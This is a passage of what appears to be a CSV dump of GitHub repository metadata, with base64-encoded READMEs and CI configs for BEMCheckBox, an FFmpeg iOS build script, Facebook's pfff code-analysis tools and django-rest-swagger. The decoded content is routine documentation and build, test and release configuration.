b3RvY29sLCB3aGljaCBpcyBjb21wb3NlZCBvZiB0d28gb3B0aW9uYWwgbWV0
aG9kczoKCi0gYGRpZFRhcENoZWNrQm94OmAgIApTZW50IHRvIHRoZSBkZWxl
Z2F0ZSBldmVyeSB0aW1lIHRoZSBjaGVjayBib3ggZ2V0cyB0YXBwZWQsIGFm
dGVyIGl0cyBwcm9wZXJ0aWVzIGFyZSB1cGRhdGVkIChgb25gKSwgYnV0IGJl
Zm9yZSB0aGUgYW5pbWF0aW9ucyBhcmUgY29tcGxldGVkLgoKLSBgYW5pbWF0
aW9uRGlkU3RvcEZvckNoZWNrQm94OmAgIApTZW50IHRvIHRoZSBkZWxlZ2F0
ZSBldmVyeSB0aW1lIHRoZSBjaGVjayBib3ggZmluaXNoZXMgYmVpbmcgYW5p
bWF0ZWQuCgojIyMgQ3VzdG9taXphdGlvbgoqKkJFTUNoZWNrQm94KiogaXMg
ZXhjbHVzaXZlbHkgY3VzdG9taXphYmxlIHRob3VnaCBwcm9wZXJ0aWVzLiAg
ClRoZSBmb2xsb3dpbmcgZGlhZ3JhbSBwcm92aWRlcyBhIGdvb2Qgb3ZlcnZp
ZXc6ICAKPHAgYWxpZ249ImNlbnRlciI+PGltZyBzcmM9Ii4vLmFzc2V0cy9C
RU1DaGVja0JveCBwcm9wZXJ0aWVzLmpwZyIvPjwvcD4KCgojIyMjIyBBcHBh
cmVuY2UgUHJvcGVydGllcwpgbGluZVdpZHRoYCAtIENHRmxvYXQgIApUaGUg
d2lkdGggb2YgdGhlIGxpbmVzIG9mIHRoZSBjaGVjayBtYXJrIGFuZCBib3gu
IERlZmF1bHRzIHRvIDIuMC4gIAoKYGhpZGVCb3hgIC0gQk9PTCAgCkJPT0wg
dG8gY29udHJvbCBpZiB0aGUgYm94IHNob3VsZCBiZSBoaWRkZW4gb3Igbm90
LiBTZXR0aW5nIHRoaXMgcHJvcGVydHkgdG8gYFlFU2Agd2lsbCBlc3NlbnRp
YWxseSB0dXJuIHRoZSBjaGVja2JveCBpbnRvIGEgY2hlY2sgbWFyay4gRGVm
YXVsdHMgdG8gYE5PYC4KCmBib3hUeXBlYCAtIEJFTUJveFR5cGUgICAKVGhl
IHR5cGUgb2YgYm94IHRvIHVzZS4gU2VlIGBCRU1Cb3hUeXBlYCBmb3IgcG9z
c2libGUgdmFsdWVzLiBEZWZhdWx0cyB0byBgQkVNQm94VHlwZUNpcmNsZWAu
IAo8cCBhbGlnbj0iY2VudGVyIj48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNo
ZWNrQm94IGJveCB0eXBlLmpwZyIvPjwvcD4KCmB0aW50Q29sb3JgIC0gVUlD
b2xvciAgClRoZSBjb2xvciBvZiB0aGUgYm94IHdoZW4gdGhlIGNoZWNrYm94
IGlzIE9mZi4KCmBvbkNoZWNrQ29sb3JgIC0gVUlDb2xvciAgClRoZSBjb2xv
ciBvZiB0aGUgY2hlY2sgbWFyayB3aGVuIGl0IGlzIE9uLgoKYG9uRmlsbENv
bG9yYCAtIFVJQ29sb3IgIApUaGUgY29sb3Igb2YgdGhlIGluc2lkZSBvZiB0
aGUgYm94IHdoZW4gaXQgaXMgT24uCgpgb25UaW50Q29sb3JgIC0gVUlDb2xv
ciAgClRoZSBjb2xvciBvZiB0aGUgbGluZSBhcm91bmQgdGhlIGJveCB3aGVu
IGl0IGlzIE9uLgoKIyMjIyMgQW5pbWF0aW9ucwpgYW5pbWF0aW9uRHVyYXRp
b25gIC0gQ0dGbG9hdCAgClRoZSBkdXJhdGlvbiBpbiBzZWNvbmRzIG9mIHRo
ZSBhbmltYXRpb25zLiBEZWZhdWx0cyB0byBgMC41YC4KCmBvbkFuaW1hdGlv
blR5cGVgIC0gQkVNQW5pbWF0aW9uVHlwZSAgClRoZSB0eXBlIG9mIGFuaW1h
dGlvbiB0byB1c2Ugd2hlbiB0aGUgY2hlY2tib3ggZ2V0cyBjaGVja2VkLiBE
ZWZhdWx0cyB0byBgQkVNQW5pbWF0aW9uVHlwZVN0cm9rZWAuIFNlZSBgQkVN
QW5pbWF0aW9uVHlwZWAgYmVsbG93IGZvciBwb3NzaWJsZSB2YWx1ZXMuCgpg
b2ZmQW5pbWF0aW9uVHlwZWAgLSBCRU1BbmltYXRpb25UeXBlICAKVGhlIHR5
cGUgb2YgYW5pbWF0aW9uIHRvIHVzZSB3aGVuIHRoZSBjaGVja2JveCBnZXRz
IHVuY2hlY2tlZC4gRGVmYXVsdHMgdG8gYEJFTUFuaW1hdGlvblR5cGVTdHJv
a2VgLiBTZWUgYEJFTUFuaW1hdGlvblR5cGVgIGJlbGxvdyBmb3IgcG9zc2li
bGUgdmFsdWVzLgoKYEJFTUFuaW1hdGlvblR5cGVgICAKVGhlIHBvc3NpYmxl
IHZhbHVlcyBmb3IgYG9uQW5pbWF0aW9uVHlwZWAgYW5kIGBvZmZBbmltYXRp
b25UeXBlYC4gIAotIGBCRU1BbmltYXRpb25UeXBlU3Ryb2tlYAo8cCBhbGln
bj0ibGVmdCI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveC1TdHJv
a2UuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9uVHlwZUZpbGxgCjxwIGFs
aWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNoZWNrQm94LUZp
bGwuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9uVHlwZUJvdW5jZWAKPHAg
YWxpZ249ImxlZnQiPjxpbWcgc3JjPSIuLy5hc3NldHMvQkVNQ2hlY2tCb3gt
Qm91bmNlLmdpZiIvPjwvcD4KCi0gYEJFTUFuaW1hdGlvblR5cGVGbGF0YAo8
cCBhbGlnbj0ibGVmdCI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0Jv
eC1GbGF0LmdpZiIvPjwvcD4KCi0gYEJFTUFuaW1hdGlvblR5cGVPbmVTdHJv
a2VgCjxwIGFsaWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRzL0JFTUNo
ZWNrQm94LU9uZS1TdHJva2UuZ2lmIi8+PC9wPgoKLSBgQkVNQW5pbWF0aW9u
VHlwZUZhZGVgCjxwIGFsaWduPSJsZWZ0Ij48aW1nIHNyYz0iLi8uYXNzZXRz
L0JFTUNoZWNrQm94LUZhZGUuZ2lmIi8+PC9wPgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU3LjMKCnNj
cmlwdDoKLSB4Y29kZWJ1aWxkIGNsZWFuIGJ1aWxkIHRlc3QgLXByb2plY3Qg
IlNhbXBsZSBQcm9qZWN0L0NoZWNrQm94Lnhjb2RlcHJvaiIgLXNjaGVtZSBD
aGVja0JveCAtc2RrIGlwaG9uZXNpbXVsYXRvcjkuMyAtZGVzdGluYXRpb24g
Ik9TPTkuMyxuYW1lPWlQaG9uZSA1UyIgT05MWV9BQ1RJVkVfQVJDSD1OTwo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'FFmpeg-iOS-build-script',12207953,b'Shell scripts to build FFmpeg for iOS and tvOS',b'Shell',3,2393,,2393,False,b'https://api.github.com/repos/kewlbear/FFmpeg-iOS-build-script/forks',"IyBGRm1wZWcgaU9TIGJ1aWxkIHNjcmlwdAoKWyFbQnVpbGQgU3RhdHVzXSho
dHRwczovL3RyYXZpcy1jaS5vcmcva2V3bGJlYXIvRkZtcGVnLWlPUy1idWls
ZC1zY3JpcHQuc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1j
aS5vcmcva2V3bGJlYXIvRkZtcGVnLWlPUy1idWlsZC1zY3JpcHQpCgpUaGlz
IGlzIGEgc2hlbGwgc2NyaXB0IHRvIGJ1aWxkIEZGbXBlZyBsaWJyYXJpZXMg
Zm9yIGlPUyBhbmQgdHZPUyBhcHBzLgoKVGVzdGVkIHdpdGg6CgoqIEZGbXBl
ZyA0LjIKKiBYY29kZSAxMC4xCgojIyBSZXF1aXJlbWVudHMKCiogaHR0cHM6
Ly9naXRodWIuY29tL2xpYmF2L2dhcy1wcmVwcm9jZXNzb3IKKiB5YXNtIDEu
Mi4wCgojIyBVc2FnZQoKVXNlIGJ1aWxkLWZmbXBlZy10dm9zLnNoIGZvciB0
dk9TLgoKKiBUbyBidWlsZCBldmVyeXRoaW5nOgoKICAgICAgICAuL2J1aWxk
LWZmbXBlZy5zaAoKKiBUbyBidWlsZCBhcm02NCBsaWJyYXJpZXM6CgogICAg
ICAgIC4vYnVpbGQtZmZtcGVnLnNoIGFybTY0CgoqIFRvIGJ1aWxkIGZhdCBs
aWJyYXJpZXMgZm9yIGFybXY3IGFuZCB4ODZfNjQgKDY0LWJpdCBzaW11bGF0
b3IpOgoKICAgICAgICAuL2J1aWxkLWZmbXBlZy5zaCBhcm12NyB4ODZfNjQK
CiogVG8gYnVpbGQgZmF0IGxpYnJhcmllcyBmcm9tIHNlcGFyYXRlbHkgYnVp
bHQgdGhpbiBsaWJyYXJpZXM6CgogICAgICAgIC4vYnVpbGQtZmZtcGVnLnNo
IGxpcG8KCiMjIERvd25sb2FkCgpZb3UgY2FuIGRvd25sb2FkIGEgYmluYXJ5
IGZvciBGRm1wZWcgNC4yIHJlbGVhc2UgYXQgaHR0cHM6Ly9kb3dubG9hZHMu
c291cmNlZm9yZ2UubmV0L3Byb2plY3QvZmZtcGVnLWlvcy9mZm1wZWctaW9z
LW1hc3Rlci50YXIuYnoyCgojIyBFeHRlcm5hbCBsaWJyYXJpZXMKCllvdSBz
aG91bGQgbGluayB5b3VyIGFwcCB3aXRoCgoqIGxpYnouZHlsaWIKKiBsaWJi
ejIuZHlsaWIKKiBsaWJpY29udi5keWxpYgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCgpzY3JpcHQ6IC4vYnVpbGQtZmZtcGVn
LnNoIDI+LnN0ZGVycgoKZW52OgogICAgZ2xvYmFsOgogICAgICAgIC0gc2Vj
dXJlOiAiUE9vZUIwd05hSVBLT1J1OHNvbEJmRHdTYmdrNmJzeFNKcFZXcVZh
d2xlZFlpWkhuWUxYVUR6RGF3b0tPWHpqSjFvUVFpbHVaV0NtditSWERBOWd0
aFROckgwOGZ1VUV2c1VIQnI3c2dIcWFPc2tFYktOL3MyOTYyRkx5NEZSWmRR
eVpGa3Jyek5jcW5jM3hheGdGNVp5alJld3RCMEppb2FPU0FQRUg4QUxjPSIK
ICAgICAgICAtIFRBUkJBTEw9ZmZtcGVnLWlvcy0kVFJBVklTX0JSQU5DSC50
YXIuYnoyCgphZnRlcl9zdWNjZXNzOgogICAgLSB0YXIgY2pmICRUQVJCQUxM
IEZGbXBlZy1pT1MgLnN0ZGVyciBzY3JhdGNoLyovY29uZmlnLmxvZyBmZm1w
ZWcqL0xJQ0VOU0UubWQgZmZtcGVnKi9DT1BZSU5HLiogUkVBRE1FLm1kCiAg
ICAtIG9wZW5zc2wgYWVzLTI1Ni1jYmMgLWsgIiRzZWNyZXQiIC1pbiAuc2Yg
LWQgLWEgLW91dCBpZF9zZgogICAgLSBjaG1vZCA2MDAgaWRfc2YKICAgIC0g
c2NwIC1pIGlkX3NmIC1vICdTdHJpY3RIb3N0S2V5Q2hlY2tpbmcgbm8nICRU
QVJCQUxMIGtvb2xiZWFyQGZycy5zb3VyY2Vmb3JnZS5uZXQ6L2hvbWUvZnJz
L3Byb2plY3QvZmZtcGVnLWlvcwoKYWZ0ZXJfZmFpbHVyZTogY2F0IC5zdGRl
cnIKCm9zeF9pbWFnZTogeGNvZGU4LjMKCnN1ZG86IGZhbHNlCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogQ0kKCm9uOiBbcHVzaF0KCmpvYnM6CiAgYnVpbGQ6CgogICAgcnVu
cy1vbjogbWFjT1MtbGF0ZXN0CiAgICAKICAgIHN0ZXBzOgogICAgLSB1c2Vz
OiBhY3Rpb25zL2NoZWNrb3V0QHYxCiAgICAtIG5hbWU6IGJ1aWxkCiAgICAg
IHJ1bjogLi9idWlsZC1mZm1wZWcuc2ggMj4uc3RkZXJyCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pfff',932626,"b'Tools for code analysis, visualizations, or style-preserving source transformation.'",b'OCaml',36,2393,,2393,False,b'https://api.github.com/repos/facebookarchive/pfff/forks',"CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBmZmYKClshW0J1aWxk
IFN0YXR1c10oaHR0cHM6Ly90cmF2aXMtY2kub3JnL2ZhY2Vib29rL3BmZmYu
c3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvZmFj
ZWJvb2svcGZmZikKCnBmZmYgaXMgYSBzZXQgb2YgdG9vbHMgYW5kIEFQSXMg
dG8gcGVyZm9ybSBzdGF0aWMgYW5hbHlzaXMsIGNvZGUKdmlzdWFsaXphdGlv
bnMsIGNvZGUgbmF2aWdhdGlvbnMsIG9yIHN0eWxlLXByZXNlcnZpbmcgc291
cmNlLXRvLXNvdXJjZQp0cmFuc2Zvcm1hdGlvbnMgc3VjaCBhcyByZWZhY3Rv
cmluZ3Mgb24gc291cmNlIGNvZGUuIFRoZXJlIGlzIGdvb2QKc3VwcG9ydCBm
b3IgQywgSmF2YSwgSmF2YXNjcmlwdCBhbmQgUEhQLiBUaGVyZSBpcyBhbHNv
IHByZWxpbWluYXJ5CnN1cHBvcnQgZm9yIG90aGVyIGxhbmd1YWdlcyBzdWNo
IGFzIEMrKywgUnVzdCwgQyMsIEh0bWwsIENTUywgRXJsYW5nLApMaXNwLCBI
YXNrZWxsLCBQeXRob24sIE9QQSBhbmQgU1FMLiBUaGVyZSBpcyBhbHNvIHZl
cnkgZ29vZCBzdXBwb3J0IGZvcgpPQ2FtbCBjb2RlIHNvIHRoYXQgdGhlIGZy
YW1ld29yayBjYW4gYmUgdXNlZCBvbiB0aGUgY29kZSBvZiBwZmZmCml0c2Vs
Zi4KCkZvciBlYWNoIGxhbmd1YWdlcyB0aGVyZSBhcmUgbWFpbmx5IDIgbGli
cmFyaWVzLCBmb3IgaW5zdGFuY2UKcGFyc2luZ19waHAuY21hIGFuZCBhbmFs
eXNpc19waHAuY21hLCB0aGF0IHlvdSBjYW4KZW1iZWQgaW4geW91ciBvd24g
YXBwbGljYXRpb24gaWYgeW91IG5lZWQgdG8gcHJvY2VzcyBQSFAgY29kZS4g
U2VlIHRoZQpkZW1vcy8gZGlyZWN0b3J5IGZvciBleGFtcGxlIG9mIHVzZSBv
ZiB0aGUgcGZmZiBBUEkuIFNlZSBhbHNvCmRvY3MvbWFudWFsL1BhcnNpbmdf
eHh4LnBkZiBhbmQgZG9jcy9tYW51YWwvQW5hbHl6aXNfeHh4LnBkZiBmb3IK
bW9yZSBkb2N1bWVudGF0aW9uIG9uIGhvdyB0byB1c2Ugb3IgZXh0ZW5kIHBm
ZmYuCgpwZmZmIGlzIGFsc28gbWFkZSBvZiBmZXcgdG9vbHM6CiAtIHBmZmYs
IHdoaWNoIGFsbG93cyB0byB0ZXN0IHRoZSBkaWZmZXJlbnQgcGFyc2VycyBv
biBhIHNpbmdsZSBmaWxlCiAtIHNjaGVjaywgYSBidWcgZmluZGVyCiAtIHN0
YWdzLCBhbiBFbWFjcyB0YWcgZ2VuZXJhdG9yCiAtIHNncmVwLCBhIHN5bnRh
Y3RpY2FsIGdyZXAKIC0gc3BhdGNoLCBhIHN5bnRhY3RpY2FsIHBhdGNoCiAt
IGNvZGVtYXAsIHdoaWNoIGlzIGEgZ3RrIGFuZCBjYWlybyBiYXNlZCBzb3Vy
Y2UgY29kZQogICB2aXN1YWxpemVyL25hdmlnYXRvci9zZWFyY2hlciBsZXZl
cmFnaW5nCiAgIHRoZSBpbmZvcm1hdGlvbiBjb21wdXRlZCBwcmV2aW91c2x5
IGJ5IHBmZmZfZGIgYW5kIGNvZGVncmFwaC4KIC0gY29kZWdyYXBoLCBhIHNv
dXJjZSBjb2RlIGluZGV4ZXIgYW5kIHBhY2thZ2UvbW9kdWxlL2NsYXNzCiAg
IGRlcGVuZGVuY3kgdmlzdWFsaXplcgogLSBjb2RlcXVlcnksIGFuIGludGVy
YWN0aXZlIHRvb2wgYSBsYSBTUUwgdG8gcXVlcnkgaW5mb3JtYXRpb24KICAg
YWJvdXQgdGhlIHN0cnVjdHVyZSBvZiBhIGNvZGViYXNlIHVzaW5nIFByb2xv
ZyBhcyB0aGUgcXVlcnkgZW5naW5lCiAtIHBmZmZfZGIsIHdoaWNoIGRvZXMg
c29tZSBnbG9iYWwgYW5hbHlzaXMgb24gYSBzZXQgb2Ygc291cmNlIGZpbGVz
IGFuZAogICBzdG9yZSB0aGUgZGF0YSBpbiBhIG1hcnNoYWxsZWQgZm9ybSBp
biBhIGZpbGUgc29tZXdoZXJlIChlLmcuIC90bXAvZGIuanNvbikKCkZvciBt
b3JlIGluZm9ybWF0aW9uLCBsb29rIGF0IHRoZSBwZmZmIHdpa2kgaGVyZToK
IGh0dHA6Ly9naXRodWIuY29tL2ZhY2Vib29rL3BmZmYvd2lraS9NYWluCmFz
IHdlbGwgYXMgdGhlIGRvY3MvbWFudWFsLyBkaXJlY3RvcnkuCgpVc2FnZSBm
b3IgcGZmZjoKLS0tLS0tLS0tLS0tLS0tLS0KCiAgICQgLi9wZmZmIC1wYXJz
ZV9waHAgZGVtb3MvZm9vLnBocAoKb3IKCiAgICQgLi9wZmZmIC1kdW1wX3Bo
cCBkZW1vcy9mb28ucGhwCgpZb3UgY2FuIGFsc28gbG9vayBhdCAuL3BmZmYg
LS1oZWxwCgpVc2FnZSBmb3IgcGZmZl9kYjoKLS0tLS0tLS0tLS0tLS0tLS0t
LQoKICAgJCAuL3BmZmZfZGIgLWxhbmcgbWwgLW8gL3RtcC9wZmZmLmpzb24g
fi9wZmZmCgp0byBhbmFseXplIGFsbCB0aGUgLm1sIGFuZCAubWxpIGZpbGVz
IHVuZGVyIH4vcGZmZiBhbmQgc3RvcmUgbWV0YWRhdGEKaW5mb3JtYXRpb24g
KHRoZSBkYXRhYmFzZSkgaW4gL3RtcC9wZmZmLmpzb24KClVzYWdlIGZvciBj
b2RlbWFwOgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiAgJCAuL2NvZGVt
YXAgfi9wZmZmCgpUaGlzIHNob3VsZCBsYXVuY2ggYSBndGstYmFzZWQgR1VJ
IHRoYXQgYWxsb3dzIHlvdSB0byB2aXN1YWxpemUKc291cmNlIGNvZGUgYW5k
IHBlcmZvcm0gc29tZSBjb2RlIHNlYXJjaC4KClVzYWdlIGZvciBjb2RlZ3Jh
cGg6Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKICAkIC4vY29kZWdyYXBo
IC1sYW5nIGNtdCAtYnVpbGQgfi9wZmZmCgp0byBnZW5lcmF0ZSBhIGdyYXBo
X2NvZGUubWFyc2hhbGwgZmlsZSBpbiB+L3BmZmYgY29udGFpbmluZwphbGwg
ZGVwZW5kZW5jeSBpbmZvcm1hdGlvbiBhYm91dCB0aGUgcGZmZiBjb2RlYmFz
ZSB1c2luZyB0aGUKdHlwZWQgYnl0ZWNvZGUgLmNtdCBmaWxlcyBnZW5lcmF0
ZWQgZHVyaW5nIHRoZSBjb21waWxhdGlvbiBvZiBwZmZmLgoKICAkIC4vY29k
ZWdyYXBoIH4vcGZmZgoKVGhpcyBzaG91bGQgbGF1bmNoIGEgZ3RrLWJhc2Vk
IEdVSSB0aGF0IGFsbG93cyB5b3UgdG8gdmlzdWFsaXplCnNvdXJjZSBjb2Rl
IGRlcGVuZGVuY2llcy4KCk1vcmUgaW5mb3JtYXRpb24KLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQoKTG9vayBhdCB0aGUgcGZmZiB3aWtpIGhlcmU6IGh0dHA6
Ly9naXRodWIuY29tL2ZhY2Vib29rL3BmZmYvd2lraS9NYWluCg==
",,"bGFuZ3VhZ2U6IGMKc2NyaXB0OiBiYXNoIC1leCB0cmF2aXMtY2kuc2gKCm5v
dGlmaWNhdGlvbnM6CiAgZW1haWw6CiAgICByZWNpcGllbnRzOgogICAgICAt
IHlvYW5uLnBhZGlvbGVhdUBnbWFpbC5jb20KICBvbl9zdWNjZXNzOiBjaGFu
Z2UKICBvbl9mYWlsdXJlOiBhbHdheXMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'django-rest-swagger',10674033,b'Swagger Documentation Generator for Django REST Framework: deprecated',b'Python',151,2393,,2393,False,b'https://api.github.com/repos/marcgibbons/django-rest-swagger/forks',"IyBEamFuZ28gUkVTVCBTd2FnZ2VyOiBkZXByZWNhdGVkICgyMDE5LTA2LTA0
KQoKVGhpcyBwcm9qZWN0IGlzIG5vIGxvbmdlciBiZWluZyBtYWludGFpbmVk
LiBQbGVhc2UgY29uc2lkZXIgKipkcmYteWFzZyoqIGFzIGFuIGFsdGVybmF0
aXZlL3N1Y2Nlc3Nvci4gSSBoYXZlbid0IHBlcnNvbmFsbHkgdXNlZCBpdCwg
YnV0IGl0IGxvb2tzIGZlYXR1cmUtY29tcGxldGUgYW5kIGlzIGFjdGl2ZWx5
IG1haW50YWluZWQuCgojIyMgaHR0cHM6Ly9naXRodWIuY29tL2F4bnNhbjEy
L2RyZi15YXNnCgpUaGFua3MgZm9yIGFsbCB0aGUgc3VwcG9ydCBhbmQgY29u
dHJpYnV0aW9ucyBvdmVyIHRoZSB5ZWFycy4gU3BlY2lhbCB0aGFua3MgdG8g
W0xpZ2h0cyBvbiBTb2Z0d2FyZV0oaHR0cHM6Ly9saWdodHNvbnNvZnR3YXJl
LmNvbS8pLCBbTGluY29sbiBMb29wXShodHRwczovL2xpbmNvbG5sb29wLmNv
bS8pIGFuZCBCTk9USU9OUyBmb3IgZ2VuZXJvdXNseSBkb25hdGluZyB0aW1l
IHRvIHdvcmsgb24gdGhpcyBwcm9qZWN0IDpoZWFydDouCgotLS0KClshW2J1
aWxkLXN0YXR1cy1iYWRnZV1dW2J1aWxkLXN0YXR1c10KWyFbY29kZWNvdl0o
aHR0cHM6Ly9jb2RlY292LmlvL2doL21hcmNnaWJib25zL2RqYW5nby1yZXN0
LXN3YWdnZXIvYnJhbmNoL21hc3Rlci9ncmFwaC9iYWRnZS5zdmcpXShodHRw
czovL2NvZGVjb3YuaW8vZ2gvbWFyY2dpYmJvbnMvZGphbmdvLXJlc3Qtc3dh
Z2dlcikKWyFbcHlwaS12ZXJzaW9uXV1bcHlwaV0KCgpbIVtEZXBsb3ldKGh0
dHBzOi8vd3d3Lmhlcm9rdWNkbi5jb20vZGVwbG95L2J1dHRvbi5zdmcpXSho
dHRwczovL2hlcm9rdS5jb20vZGVwbG95KQoKCiMjIyMgQW4gQVBJIGRvY3Vt
ZW50YXRpb24gZ2VuZXJhdG9yIGZvciBTd2FnZ2VyIFVJIGFuZCBEamFuZ28g
UkVTVCBGcmFtZXdvcmsKCkZ1bGwgZG9jdW1lbnRhdGlvbjogaHR0cDovL21h
cmNnaWJib25zLmdpdGh1Yi5pby9kamFuZ28tcmVzdC1zd2FnZ2VyLwoKCiMj
IEluc3RhbGxhdGlvbgoKMS4gYHBpcCBpbnN0YWxsIGRqYW5nby1yZXN0LXN3
YWdnZXJgCgoyLiBBZGQgYHJlc3RfZnJhbWV3b3JrX3N3YWdnZXJgIHRvIHlv
dXIgYElOU1RBTExFRF9BUFBTYCBzZXR0aW5nOgoKICAgIGBgYHB5dGhvbgog
ICAgICAgIElOU1RBTExFRF9BUFBTID0gKAogICAgICAgICAgICAuLi4KICAg
ICAgICAgICAgJ3Jlc3RfZnJhbWV3b3JrX3N3YWdnZXInLAogICAgICAgICkK
ICAgIGBgYAoKIyMgUmVuZGVyaW5nIFN3YWdnZXIgU3BlY2lmaWNhdGlvbiBh
bmQgRG9jdW1lbnRhdGlvbgoKVGhpcyBwYWNrYWdlIHNoaXBzIHdpdGggdHdv
IHJlbmRlcmVyIGNsYXNzZXM6CgoxLiBgT3BlbkFQSVJlbmRlcmVyYCBnZW5l
cmF0ZXMgdGhlIE9wZW5BUEkgKGZrYSBTd2FnZ2VyKSBKU09OIHNjaGVtYSBz
cGVjaWZpY2F0aW9uLiBUaGlzIHJlbmRlcmVyIHdpbGwgYmUgcHJlc2VudGVk
IGlmOgogIC0gIGBDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29wZW5hcGkr
anNvbmAgaXMgc3BlY2lmaWVkIGluIHRoZSBoZWFkZXJzLgogIC0gYD9mb3Jt
YXQ9b3BlbmFwaWAgaXMgcGFzc2VkIGFzIHF1ZXJ5IHBhcmFtCjIuIGBTd2Fn
Z2VyVUlSZW5kZXJlcmAgZ2VuZXJhdGVzIHRoZSBTd2FnZ2VyIFVJIGFuZCBy
ZXF1aXJlcyB0aGUgYE9wZW5BUElSZW5kZXJlcmAKCgojIyMgUXVpY2sgU3Rh
cnQgRXhhbXBsZToKYGBgcHl0aG9uCmZyb20gZGphbmdvLmNvbmYudXJscyBp
bXBvcnQgdXJsCmZyb20gcmVzdF9mcmFtZXdvcmtfc3dhZ2dlci52aWV3cyBp
bXBvcnQgZ2V0X3N3YWdnZXJfdmlldwoKc2NoZW1hX3ZpZXcgPSBnZXRfc3dh
Z2dlcl92aWV3KHRpdGxlPSdQYXN0ZWJpbiBBUEknKQoKdXJscGF0dGVybnMg
PSBbCiAgICB1cmwocideJCcsIHNjaGVtYV92aWV3KQpdCmBgYAoKIyMgUmVx
dWlyZW1lbnRzCiogRGphbmdvIDEuOCsKKiBEamFuZ28gUkVTVCBmcmFtZXdv
cmsgMy41LjErCiogUHl0aG9uIDIuNywgMy41LCAzLjYKCgojIyBUZXN0aW5n
CgotIFJ1biBgJCB0b3hgIHRvIGV4ZWN1dGUgdGhlIHRlc3Qgc3VpdGUgYWdh
aW5zdCBhbGwgc3VwcG9ydGVkIGVudmlyb25tZW50cy4KLSBSdW4gYC4vcnVu
dGVzdHMucHlgIHRvIHJ1biB0aGUgdGVzdCBzdWl0ZSB3aXRoaW4gdGhlIGN1
cnJlbnQgZW52aXJvbm1lbnQuCgojIyBCdWdzICYgQ29udHJpYnV0aW9ucwpQ
bGVhc2UgcmVwb3J0IGJ1Z3MgYnkgb3BlbmluZyBhbiBpc3N1ZQoKQ29udHJp
YnV0aW9ucyBhcmUgd2VsY29tZSBhbmQgYXJlIGVuY291cmFnZWQhCgojIyBT
cGVjaWFsIFRoYW5rcwpNYW55IHRoYW5rcyB0byBUb20gQ2hyaXN0aWUgJiBh
bGwgdGhlIGNvbnRyaWJ1dG9ycyB3aG8gaGF2ZSBkZXZlbG9wZWQgW0RqYW5n
byBSRVNUIEZyYW1ld29ya10oaHR0cDovL2RqYW5nby1yZXN0LWZyYW1ld29y
ay5vcmcvKQoKCltidWlsZC1zdGF0dXMtYmFkZ2VdOiBodHRwczovL3RyYXZp
cy1jaS5vcmcvbWFyY2dpYmJvbnMvZGphbmdvLXJlc3Qtc3dhZ2dlci5zdmc/
YnJhbmNoPW1hc3RlcgpbYnVpbGQtc3RhdHVzXTogaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL21hcmNnaWJib25zL2RqYW5nby1yZXN0LXN3YWdnZXIKW3B5cGkt
dmVyc2lvbl06IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS92L2RqYW5n
by1yZXN0LXN3YWdnZXIuc3ZnCltweXBpXTogaHR0cHM6Ly9weXBpLnB5dGhv
bi5vcmcvcHlwaS9kamFuZ28tcmVzdC1zd2FnZ2VyCltsaWNlbnNlXTogaHR0
cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9kamFuZ28tcmVzdC1zd2FnZ2Vy
LwpbZG9jcy1iYWRnZV06IGh0dHBzOi8vcmVhZHRoZWRvY3MuaW8vcHJvamVj
dHMvZGphbmdvLXJlc3Qtc3dhZ2dlci9iYWRnZS8KW2RvY3NdOiBodHRwOi8v
ZGphbmdvLXJlc3Qtc3dhZ2dlci5yZWFkdGhlZG9jcy5pby8K
",,"bGFuZ3VhZ2U6IHB5dGhvbgpweXRob246CiAgLSAiMy42IgogIC0gIjIuNyIK
c3VkbzogZmFsc2UKbWF0cml4OgogIGZhc3RfZmluaXNoOiB0cnVlCmluc3Rh
bGw6CiAgLSBwaXAgaW5zdGFsbCB0b3ggdG94LXRyYXZpcyBjb2RlY292CnNj
cmlwdDoKICAtIHRveAphZnRlcl9zdWNjZXNzOgogIGNvZGVjb3YKCg==
